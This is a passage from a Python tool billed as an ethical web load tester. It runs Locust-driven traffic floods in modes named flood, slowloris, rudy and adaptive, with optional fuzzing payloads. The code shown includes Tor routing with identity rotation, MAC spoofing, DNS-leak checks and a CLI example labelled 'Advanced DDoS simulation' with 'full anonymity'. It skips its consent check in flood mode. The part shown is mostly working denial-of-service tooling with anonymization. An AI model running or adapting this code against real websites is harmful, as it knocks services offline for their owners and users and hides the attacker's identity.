    print(tabulate(summary_data, headers=["Metric", "Value"], tablefmt="grid"))
    
    # Performance metrics
    print(f"\n{Fore.YELLOW}⏱ Response Times:{Style.RESET_ALL}")
    perf_data = [
        ["Average", f"{metrics.avg_response_time:.2f}ms"],
        ["Median", f"{metrics.median_response_time:.2f}ms"],
        ["95th Percentile", f"{metrics.p95_response_time:.2f}ms"],
        ["99th Percentile", f"{metrics.p99_response_time:.2f}ms"],
        ["Min", f"{metrics.min_response_time:.2f}ms"],
        ["Max", f"{metrics.max_response_time:.2f}ms"],
    ]
    print(tabulate(perf_data, headers=["Metric", "Value"], tablefmt="simple"))
    
    # Status code distribution
    if metrics.status_codes:
        print(f"\n{Fore.YELLOW}📊 Status Code Distribution:{Style.RESET_ALL}")
        status_data = [[code, count, f"{count/metrics.total_requests*100:.1f}%"] 
                       for code, count in sorted(metrics.status_codes.items())]
        print(tabulate(status_data, headers=["Code", "Count", "Percentage"], tablefmt="simple"))
    
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
    
    # Export reports
    output_dir.mkdir(exist_ok=True, parents=True)
    
    # JSON report
    json_file = output_dir / f'report_{timestamp}.json'
    report_data = {
        'timestamp': timestamp,
        'configuration': vars(args),
        'metrics': metrics.to_dict(),
    }
    with open(json_file, 'w') as f:
        json.dump(report_data, f, indent=2)
    logger.info(f"{Fore.GREEN}✓ JSON report: {json_file}{Style.RESET_ALL}")
    
    # CSV report
    csv_file = output_dir / f'report_{timestamp}.csv'
    metrics.export_csv(csv_file)
    logger.info(f"{Fore.GREEN}✓ CSV report: {csv_file}{Style.RESET_ALL}")

# ============================================================================
# MAIN TEST EXECUTION
# ============================================================================

def run_load_test(args):
    """Execute enhanced load test."""
    tor_manager = None
    mac_spoofer = None
    metrics_collector = MetricsCollector()
    
    # Setup signal handlers
    def signal_handler(sig, frame):
        logger.info(f"\n{Fore.YELLOW}⚠ Test interrupted by user{Style.RESET_ALL}")
        cleanup(tor_manager, mac_spoofer)
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    def cleanup(tor_mgr, mac_spf):
        """Cleanup resources."""
        if tor_mgr:
            tor_mgr.stop()
        if mac_spf:
            mac_spf.restore()
    
    try:
        # Consent verification
        if args.attack_mode != 'flood' and not args.dry_run and args.consent_file:
            if not check_consent_file(args.consent_file):
                return
        
        # MAC spoofing setup
        if args.mac_interface:
            logger.info(f"{Fore.CYAN}🔧 Setting up MAC spoofing...{Style.RESET_ALL}")
            mac_spoofer = MACSpoofer(args.mac_interface)
            if not args.dry_run:
                if not mac_spoofer.spoof():
                    logger.warning(f"{Fore.YELLOW}⚠ Continuing without MAC spoofing{Style.RESET_ALL}")
        
        # Tor setup
        if args.use_tor:
            logger.info(f"{Fore.CYAN}🧅 Starting Tor network...{Style.RESET_ALL}")
            tor_manager = TorManager()
            if not tor_manager.start():
                logger.error(f"{Fore.RED}✗ Tor failed, aborting{Style.RESET_ALL}")
                cleanup(tor_manager, mac_spoofer)
                return
            
            # Show exit IP
            exit_ip = tor_manager.get_exit_ip()
            if exit_ip:
                logger.info(f"{Fore.GREEN}✓ Tor exit IP: {exit_ip}{Style.RESET_ALL}")
            
            # DNS leak check
            if args.check_dns_leak:
                check_dns_leak(tor_manager)
        
        # Proxy configuration
        setup_proxy_environment(args.use_tor, args.vpn_proxy)
        
        # Dry run mode
        if args.dry_run:
            logger.info(f"\n{Fore.GREEN}✓ DRY RUN COMPLETE - Configuration validated{Style.RESET_ALL}")
            logger.info(f"  Target: {args.target_url}")
            logger.info(f"  Attack Mode: {args.attack_mode}")
            logger.info(f"  Users: {args.users}")
            logger.info(f"  Duration: {args.duration}s")
            logger.info(f"  Tor: {'Enabled' if args.use_tor else 'Disabled'}")
            logger.info(f"  MAC Spoofing: {'Enabled' if args.mac_interface else 'Disabled'}")
            cleanup(tor_manager, mac_spoofer)
            return
        
        # Setup Locust
        setup_logging("WARNING", None)
        env = Environment(user_classes=[EnhancedWebsiteUser])
        env.create_local_runner()
        
        # Configure user behavior
        EnhancedWebsiteUser.host = args.target_url
        EnhancedWebsiteUser.attack_mode = AttackMode(args.attack_mode)
        EnhancedWebsiteUser.enable_fuzzing = args.enable_fuzzing
        
        if args.target_paths:
            EnhancedWebsiteUser.target_paths = args.target_paths.split(',')
        
        if args.post_data:
            EnhancedWebsiteUser.post_data = dict(
                item.split('=', 1) for item in args.post_data.split('&') if '=' in item
            )
        
        # Display test configuration
        logger.info(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}STARTING LOAD TEST{Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        logger.info(f"  🎯 Target: {args.target_url}")
        logger.info(f"  ⚔️  Mode: {args.attack_mode.upper()}")
        logger.info(f"  👥 Users: {args.users}")
        logger.info(f"  📈 Spawn Rate: {args.spawn_rate}/s")
        logger.info(f"  ⏱️  Duration: {args.duration}s")
        logger.info(f"  🔧 Fuzzing: {'Enabled' if args.enable_fuzzing else 'Disabled'}")
        logger.info(f"  🛡️  Anonymity: {'Tor' if args.use_tor else 'VPN' if args.vpn_proxy else 'Direct'}")
        logger.info(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        # Start test
        env.runner.start(args.users, spawn_rate=args.spawn_rate)
        
        # Progress bar
        with tqdm(total=args.duration, desc="Testing", unit="s", colour="cyan") as pbar:
            start_time = time.time()
            last_rotation = start_time
            
            while time.time() - start_time < args.duration:
                time.sleep(1)
                pbar.update(1)
                
                # Identity rotation
                if tor_manager and args.identity_rotation > 0:
                    if time.time() - last_rotation >= args.identity_rotation:
                        tor_manager.get_new_identity()
                        last_rotation = time.time()
        
        # Stop test
        env.runner.quit()
        
        # Collect metrics
        stats = env.stats.total
        metrics = TestMetrics(
            total_requests=stats.num_requests,
            successful_requests=stats.num_requests - stats.num_failures,
            failed_requests=stats.num_failures,
            avg_response_time=stats.avg_response_time,
            median_response_time=stats.median_response_time,
            p95_response_time=stats.get_response_time_percentile(0.95),
            p99_response_time=stats.get_response_time_percentile(0.99),
            min_response_time=stats.min_response_time or 0,
            max_response_time=stats.max_response_time or 0,
            requests_per_second=stats.current_rps,
        )
        
        # Generate report
        output_dir = Path.home() / '.ewlt_reports'
        generate_report(metrics, args, output_dir)
        
        # Vulnerability insights
        if metrics.failed_requests > 0:
            failure_rate = (metrics.failed_requests / metrics.total_requests) * 100
            if failure_rate > 20:
                logger.warning(f"{Fore.YELLOW}⚠ High failure rate ({failure_rate:.1f}%) - Consider rate limiting{Style.RESET_ALL}")
        
        if metrics.avg_response_time > 2000:
            logger.warning(f"{Fore.YELLOW}⚠ Slow response times - Optimize backend or add caching{Style.RESET_ALL}")
        
    except Exception as e:
        logger.error(f"{Fore.RED}✗ Test failed: {e}{Style.RESET_ALL}", exc_info=True)
    finally:
        cleanup(tor_manager, mac_spoofer)
        logger.info(f"\n{Fore.GREEN}✓ Test complete. Logs: {log_file}{Style.RESET_ALL}")

# ============================================================================
# CLI INTERFACE
# ============================================================================

def main():
    print(SECURITY_BANNER)
    
    parser = argparse.ArgumentParser(
        description="Ethical Web Load Tester v3.0 - Professional Security Testing Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic test
  python web_load_tester.py --target-url http://localhost:8080 --users 50
  
  # Advanced DDoS simulation
  python web_load_tester.py --target-url https://yoursite.com --users 200 \\
    --attack-mode adaptive --use-tor --identity-rotation 60
  
  # With full anonymity
  sudo python web_load_tester.py --target-url https://yoursite.com --users 100 \\
    --use-tor --mac-interface wlan0 --check-dns-leak
  
  # Fuzzing test
  python web_load_tester.py --target-url http://localhost/api --users 50 \\
    --enable-fuzzing --post-data "user=test&pass=test" --attack-mode flood
        """
    )
    
    # Required
    parser.add_argument('--target-url', required=True, help="Target URL (authorized testing only!)")
    
    # Load test config
    parser.add_argument('--users', type=int, default=50, help="Concurrent users (1-1000)")
    parser.add_argument('--spawn-rate', type=int, default=10, help="Users spawned/sec")
    parser.add_argument('--duration', type=int, default=60, help="Test duration (seconds)")
    parser.add_argument('--target-paths', help="Comma-separated paths")
    parser.add_argument('--post-data', help="POST data (key=value&key2=value2)")
    
    # Attack options
    parser.add_argument('--attack-mode', 
                       choices=['flood', 'slowloris', 'burst', 'adaptive', 'rudy'],
                       default='flood', help="Attack simulation mode")
    parser.add_argument('--enable-fuzzing', action='store_true', help="Enable fuzzing payloads")
    parser.add_argument('--consent-file', help="Path to consent JSON file")
    
    # Anonymity
    parser.add_argument('--use-tor', action='store_true', help="Route via Tor")
    parser.add_argument('--vpn-proxy', help="SOCKS5 proxy (socks5://host:port)")
    parser.add_argument('--mac-interface', help="Interface for MAC spoofing (requires sudo)")
    parser.add_argument('--identity-rotation', type=int, default=0, help="Tor rotation interval (seconds)")
    parser.add_argument('--check-dns-leak', action='store_true', help="Check DNS leaks")
    
    # Testing
    parser.add_argument('--dry-run', action='store_true', help="Validate config only")
    
    args = parser.parse_args()
    
    # Safety limits
    args.users = max(1, min(args.users, 1000))
    args.spawn_rate = max(1, min(args.spawn_rate, 100))
    args.duration = max(1, args.duration)
    
    # Validation
    if args.check_dns_leak and not args.use_tor:
        logger.warning(f"{Fore.YELLOW}⚠ DNS leak check requires --use-tor{Style.RESET_ALL}")
        args.check_dns_leak = False
    
    # Final warning
    if not args.dry_run:
        print(f"\n{Fore.RED}⚠️  FINAL WARNING:{Style.RESET_ALL}")
        print(f"   Target: {Fore.YELLOW}{args.target_url}{Style.RESET_ALL}")
        print(f"   Mode: {Fore.YELLOW}{args.attack_mode.upper()}{Style.RESET_ALL}")
        print(f"   Users: {Fore.YELLOW}{args.users}{Style.RESET_ALL}")
        print(f"\n   {Fore.RED}ENSURE YOU HAVE AUTHORIZATION TO TEST THIS SYSTEM!{Style.RESET_ALL}")
        
        response = input(f"\n{Fore.CYAN}Type 'YES' to proceed: {Style.RESET_ALL}")
        if response.strip().upper() != 'YES':
            print(f"{Fore.YELLOW}Test cancelled.{Style.RESET_ALL}")
            return
    
    run_load_test(args)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Test cancelled by user.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        logger.error(f"{Fore.RED}Fatal error: {e}{Style.RESET_ALL}", exc_info=True)
        sys.exit(1)